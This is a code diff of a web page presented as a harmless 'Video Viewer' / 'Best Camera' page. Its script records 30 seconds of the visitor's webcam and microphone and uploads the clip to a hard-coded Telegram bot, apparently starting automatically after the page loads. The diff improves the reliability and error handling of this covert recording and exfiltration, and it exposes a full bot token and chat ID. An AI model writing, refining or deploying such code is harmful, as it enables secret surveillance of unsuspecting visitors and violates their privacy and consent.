@@ -4,39 +4,84 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Viewer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(120deg, #4e54c8, #8f94fb);
+            color: white;
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin: 20px 0;
+        }
+
+        .footer {
+            margin-top: auto;
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to the Video Viewer</h1>
+    <h1>Welcome to the Best Camera</h1>
 
     <script>
         async function recordVideo() {
-            const chatId = '7361816575';
-            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
+            const chatId = '7361816575'; // Replace with your chat ID
+            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI'; // Replace with your bot token
 
-            // Request access to user's camera and microphone
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
 
-            // Record video for 30 seconds
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.start();
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.start();
 
-            setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Send video to Telegram
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', blob);
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 30000); // Stop recording after 30 seconds
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 30000);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', blob, 'video.webm'); // Specify a file name for clarity
+
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                            method: 'POST',
+                            body: formData,
+                        });
+
+                        if (response.ok) {
+                            console.log('Video sent successfully!');
+                        } else {
+                            const errorText = await response.text();
+                            console.error('Failed to send video:', errorText);
+                        }
+                    } catch (error) {
+                        console.error('Error sending video:', error);
+                    }
+                };
+            } catch (error) {
+                console.error('Error accessing camera or microphone:', error);
+            }
         }
 
         // Automatically record video after a short delay
